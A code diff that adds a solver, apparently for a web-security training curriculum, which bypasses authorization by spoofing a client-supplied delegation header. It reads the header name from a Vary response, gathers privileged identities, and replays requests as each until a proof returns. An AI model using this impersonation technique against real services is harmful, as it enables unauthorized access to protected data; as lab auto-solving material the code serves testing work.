@@ -224,6 +224,64 @@ def solve_lfi(target_url: str) -> str:
 # ---------------------------------------------------------------------------
 # Curriculum Day 5: Authorization Bypass (Unprotected administrative route)
 # ---------------------------------------------------------------------------
+def solve_delegated_identity(target_url: str) -> str:
+    """Axum "pass the identity": the feature route trusts a client-supplied delegation
+    header. /api/clues names the feature and identity-directory routes; /api/identities
+    names the privileged owner (records_owner). The unauthenticated 403 echoes the header
+    it varies on (`Vary: x-delegated-user`), so the header name is discovered, not assumed.
+    Replaying the feature route as that owner returns the proof."""
+    base = target_url.rstrip("/")
+    status, clues_body, _ = _request(f"{base}/api/clues")
+    if status != 200:
+        raise WebHandlerError("Failed to fetch /api/clues")
+    clues = json.loads(clues_body)
+    feature_route = clues.get("feature_route")
+    if not feature_route:
+        raise WebHandlerError("No feature_route in clues")
+
+    # Discover the delegation header name from the rejected request's Vary.
+    status, body, headers = _request(f"{base}{feature_route}")
+    proof = _extract_proof(body, headers)
+    if proof:
+        return proof
+    header_name = "x-delegated-user"
+    for part in (headers.get("vary", "")).split(","):
+        name = part.strip().lower()
+        if name and name not in ("accept", "accept-encoding", "cookie", "origin"):
+            header_name = name
+            break
+
+    # Candidate privileged identities, records_owner first.
+    identities: list[str] = []
+    id_route = clues.get("identity_directory_route") or "/api/identities"
+    status, id_body, _ = _request(f"{base}{id_route}")
+    if status == 200:
+        try:
+            directory = json.loads(id_body)
+            for key in ("records_owner", "owner", "privileged", "admin"):
+                if isinstance(directory.get(key), str):
+                    identities.append(directory[key])
+            identities += [v for v in directory.values() if isinstance(v, str)]
+        except ValueError:
+            pass
+    identities += ["executive", "admin", "administrator", "owner", "root"]
+
+    seen: set[str] = set()
+    for route in (feature_route, clues.get("secondary_route")):
+        if not route:
+            continue
+        for who in identities:
+            if who in seen:
+                continue
+            seen.add(who)
+            status, body, headers = _request(f"{base}{route}", headers={header_name: who})
+            proof = _extract_proof(body, headers)
+            if proof:
+                return proof
+        seen.clear()
+    raise WebHandlerError("Delegated identity did not yield a proof")
+
+
 def solve_auth_bypass(target_url: str) -> str:
     """Discover unprotected dispatch route and read authorization proof."""
     base = target_url.rstrip("/")
@@ -1382,6 +1440,12 @@ def detect_and_solve(target_url: str, curriculum_day: int | None = None) -> str:
 
             if "recovery_guide_route" in clues or "recovery" in clues_body:
                 return solve_password_reset(target_url)
+
+            if "identity_directory_route" in clues or "delegated" in clues_body or framework == "Axum":
+                try:
+                    return solve_delegated_identity(target_url)
+                except Exception:
+                    pass
 
             if "policy" in clues_body or "/api/policy-format" in clues_body or framework == "ASP.NET Core":
                 try:
